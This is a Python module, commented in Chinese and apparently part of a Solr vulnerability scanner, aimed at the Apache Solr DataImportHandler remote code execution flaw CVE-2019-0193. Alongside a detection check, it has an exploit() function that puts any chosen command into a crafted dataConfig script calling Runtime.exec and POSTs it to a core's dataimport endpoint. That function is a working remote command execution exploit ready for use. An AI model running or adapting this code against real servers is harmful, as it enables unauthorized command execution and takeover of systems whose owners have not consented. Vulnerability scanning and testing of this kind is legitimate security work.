#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2019-0193 漏洞检测模块
Apache Solr DataImportHandler RCE漏洞
"""

import logging
import json
import re
import time

def check(scanner, core=None):
    """
    检测CVE-2019-0193 DataImportHandler RCE漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        cores_to_check = [core] if core else scanner.get_cores()
        if not cores_to_check:
            return False, "未发现可用的Solr核心"
        
        for core_name in cores_to_check:
            # 构造测试payload
            test_payload = """
            <dataConfig>
              <dataSource type="URLDataSource"/>
              <script><![CDATA[
                      function poc(){ java.lang.Runtime.getRuntime().exec("echo SolrScanTest");
                      }
              ]]></script>
              <document>
                <entity name="stackoverflow"
                        url="https://stackoverflow.com/feeds/tag/solr"
                        processor="XPathEntityProcessor"
                        forEach="/feed"
                        transformer="script:poc" />
              </document>
            </dataConfig>
            """
            
            try:
                # 检查是否存在dataimport处理器
                resp = scanner.request("GET", f"/solr/{core_name}/admin/mbeans?cat=QUERY&wt=json")
                if resp and "org.apache.solr.handler.dataimport.DataImportHandler" in resp.text:
                    # 发送测试请求
                    params = {
                        "command": "full-import",
                        "verbose": "false",
                        "clean": "false",
                        "commit": "true",
                        "debug": "true",
                        "core": core_name,
                        "dataConfig": test_payload
                    }
                    
                    resp = scanner.request(
                        "POST", 
                        f"/solr/{core_name}/dataimport", 
                        data=params
                    )
                    
                    if resp and resp.status_code == 200:
                        return True, f"核心 {core_name} 存在CVE-2019-0193漏洞"
            except Exception as e:
                logging.error(f"检测核心 {core_name} 异常: {str(e)}")
                
        return False, "未发现CVE-2019-0193漏洞"
    except Exception as e:
        logging.error(f"检测CVE-2019-0193异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, core=None, command=None):
    """
    利用CVE-2019-0193漏洞执行命令
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时使用第一个可用核心
        command: 要执行的命令
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    if not command:
        return False, "请提供要执行的命令"
    
    try:
        # 获取可用的核心
        cores = [core] if core else scanner.get_cores()
        if not cores:
            return False, "未发现可用的Solr核心"
        
        core_name = cores[0]
        
        # 检查是否存在dataimport处理器
        resp = scanner.request("GET", f"/solr/{core_name}/admin/mbeans?cat=QUERY&wt=json")
        if not resp or "org.apache.solr.handler.dataimport.DataImportHandler" not in resp.text:
            return False, f"核心 {core_name} 不存在DataImportHandler，无法利用CVE-2019-0193漏洞"
        
        # 构造恶意payload
        exploit_payload = f"""
        <dataConfig>
          <dataSource type="URLDataSource"/>
          <script><![CDATA[
                  function poc(){{ java.lang.Runtime.getRuntime().exec("{command.replace('"', '\\"')}");
                  }}
          ]]></script>
          <document>
            <entity name="stackoverflow"
                    url="https://stackoverflow.com/feeds/tag/solr"
                    processor="XPathEntityProcessor"
                    forEach="/feed"
                    transformer="script:poc" />
          </document>
        </dataConfig>
        """
        
        # 发送利用请求
        params = {
            "command": "full-import",
            "verbose": "false",
            "clean": "false",
            "commit": "true",
            "debug": "true",
            "core": core_name,
            "dataConfig": exploit_payload
        }
        
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/dataimport", 
            data=params
        )
        
        if resp and resp.status_code == 200:
            return True, f"命令 '{command}' 已执行，请检查结果"
        else:
            return False, "命令执行失败，可能不存在漏洞或已修复"
    except Exception as e:
        logging.error(f"利用CVE-2019-0193异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
